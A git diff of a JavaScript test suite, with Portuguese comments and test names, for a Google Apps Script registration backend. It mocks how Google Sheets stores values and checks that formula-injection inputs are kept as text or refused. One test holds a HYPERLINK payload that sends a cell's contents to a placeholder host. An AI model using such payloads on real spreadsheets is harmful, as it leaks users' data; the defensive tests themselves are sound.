@@ -12,13 +12,22 @@ const source = fs.readFileSync(path.join(root, 'apps-script/Shared.gs'), 'utf8')
 
 const HORA = 3600 * 1000;
 
+// Como o Google Sheets guarda o que é escrito: "'" no início marca texto e some;
+// "=", "+" ou "-" no início vira fórmula (aqui, um erro, que nunca casa com o texto original).
+function armazenar(v) {
+  if (typeof v !== 'string') return v;
+  if (v.charAt(0) === "'") return v.slice(1);
+  if (/^[=+\-]/.test(v)) return '#ERROR!';
+  return v;
+}
+
 function makeSheet(name) {
   const sheet = {
     name, rows: [], hidden: false,
     getName: () => sheet.name,
     setName: (n) => { sheet.name = n; return sheet; },
     getLastRow: () => sheet.rows.length,
-    appendRow: (row) => { sheet.rows.push(row.slice()); return sheet; },
+    appendRow: (row) => { sheet.rows.push(row.map(armazenar)); return sheet; },
     getDataRange: () => ({ getValues: () => sheet.rows.map((r) => r.slice()) }),
     hideSheet: () => { sheet.hidden = true; },
     setFrozenRows: () => {},
@@ -30,8 +39,8 @@ function makeSheet(name) {
       return {
         getValues: () => { ensure(); return sheet.rows.slice(r - 1, r - 1 + nr).map((row) => { const out = []; for (let j = 0; j < nc; j++) out.push(row[c - 1 + j] === undefined ? '' : row[c - 1 + j]); return out; }); },
         getValue: () => { ensure(); const v = sheet.rows[r - 1][c - 1]; return v === undefined ? '' : v; },
-        setValues: (vals) => { ensure(); vals.forEach((row, i) => row.forEach((v, j) => { sheet.rows[r - 1 + i][c - 1 + j] = v; })); },
-        setValue: (v) => { ensure(); sheet.rows[r - 1][c - 1] = v; },
+        setValues: (vals) => { ensure(); vals.forEach((row, i) => row.forEach((v, j) => { sheet.rows[r - 1 + i][c - 1 + j] = armazenar(v); })); },
+        setValue: (v) => { ensure(); sheet.rows[r - 1][c - 1] = armazenar(v); },
         setFontWeight: () => {},
       };
     },
@@ -177,8 +186,52 @@ test('dados inválidos no cadastro', () => {
 test('texto que começa com = não vira fórmula na planilha', () => {
   const w = world();
   w.call(Object.assign({}, ana, { nome: '=HYPERLINK("http://x")', whatsapp: '+5514' }));
-  assert.equal(w.contatos()[1][0], "'=HYPERLINK(\"http://x\")");
-  assert.equal(w.contatos()[1][1], "'+5514");
+  assert.equal(w.contatos()[1][0], '=HYPERLINK("http://x")');
+  assert.equal(w.contatos()[1][1], '+5514');
+});
+
+test('e-mail que começa com = ou - é recusado', () => {
+  const w = world();
+  const r = w.call(Object.assign({}, ana, { email: '=hyperlink("http://x/?"&a3,"x")&"@x.co"' }));
+  assert.equal(r.erro, 'Informe um e-mail válido.');
+  assert.equal(w.call(Object.assign({}, ana, { email: '-a@x.co' })).erro, 'Informe um e-mail válido.');
+  assert.equal(w.contatos().length, 1);
+});
+
+test('nome pendente com = continua texto depois de confirmar', () => {
+  const w = world();
+  entrar(w);
+  w.clearCache();
+  w.call(Object.assign({}, ana, { nome: '=HYPERLINK("http://x")' }));
+  const r = w.call({ action: 'confirmar', token: w.ultimoToken() });
+  assert.equal(r.ok, true);
+  assert.equal(w.contatos()[1][0], '=HYPERLINK("http://x")');
+});
+
+test('muitos cadastros: nenhum hash vira fórmula na planilha', () => {
+  const w = world();
+  for (let i = 0; i < 200; i++) {
+    w.clearCache();
+    const r = entrar(w, Object.assign({}, ana, { email: `p${i}@x.com` }));
+    assert.equal(r.ok, true, `confirmação ${i}`);
+    w.clearCache();
+    assert.equal(w.call({ action: 'sessao', chave: r.chave }).ok, true, `sessão ${i}`);
+  }
+  assert.ok(!JSON.stringify(w.tokens()).includes('#ERROR!'));
+});
+
+test('pedidos simultâneos para o mesmo e-mail enviam um e-mail só', () => {
+  const w = world();
+  let aninhado = null;
+  const fetchOriginal = w.context.UrlFetchApp.fetch;
+  // Um segundo pedido chega enquanto o primeiro ainda está enviando.
+  w.context.UrlFetchApp.fetch = (url, o) => {
+    if (!aninhado) aninhado = w.call(ana);
+    return fetchOriginal(url, o);
+  };
+  assert.equal(w.call(ana).ok, true);
+  assert.equal(aninhado.ok, false);
+  assert.equal(w.fetches.length, 1);
 });
 
 test('confirmar marca "Sim", grava as datas e devolve chave e nome', () => {
